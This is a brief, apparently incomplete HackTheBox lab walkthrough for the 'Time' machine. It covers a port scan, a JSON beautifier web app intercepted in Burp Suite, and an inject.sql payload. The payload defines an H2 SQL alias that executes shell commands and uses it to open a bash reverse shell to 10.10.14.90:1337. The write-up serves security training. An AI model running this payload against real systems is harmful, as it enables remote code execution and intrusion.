---
title: " HackTheBox {Time}"
description: Walkthrough of the Time Machine on Hackthebox.
---
![Time](https://media.discordapp.net/attachments/490431433559506954/832933487954231336/screenshot-193.png)

## Scanning port

```
Open port :

22/tcp open ssh
80/tcp open http
```

We can see that there is the ssh / 22 port and the 80 / http port which are open.

We are going to see the http / 80 port to see what is interesting.

We see an online json beautifier & Validator with 2 options, "Beatify" & "Validate!(Beta)".. I intercepted both options in burpsuite and i have just put a word in the field and submitted.

![time](https://media.discordapp.net/attachments/490431433559506954/832936431823224862/unknown.png)

Now, you need to create a inject.sql files and add a reverse shell to have it call back to me. :

```sh
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.14.90/1337 0>&1 &')
```







